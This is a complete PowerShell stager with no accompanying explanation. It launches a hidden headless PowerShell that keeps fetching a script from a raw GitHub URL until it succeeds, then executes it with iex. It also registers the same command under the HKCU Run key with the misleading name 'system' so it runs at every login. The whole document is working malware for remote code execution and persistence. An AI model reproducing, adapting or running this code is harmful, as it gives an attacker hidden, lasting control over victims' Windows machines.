$R="C:\Windows\System32\conhost.exe --headless powershell -c \`"`$s=`$null;while(`$null -eq (`$s=(New-Object Net.WebClient).DownloadString(\\\`"https://raw.githubusercontent.com/rci69/f/refs/heads/main/a\\\`"))){sleep -Seconds 5};iex(`$s);\`"";
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V system /t REG_SZ /F /D $R;
iex("C:\Windows\System32\conhost.exe --headless powershell -c `"```$s=```$null;while(```$null -eq (```$s=(New-Object Net.WebClient).DownloadString(`'https://raw.githubusercontent.com/rci69/f/refs/heads/main/a`'))){sleep -Seconds 5};iex(```$s);`"")
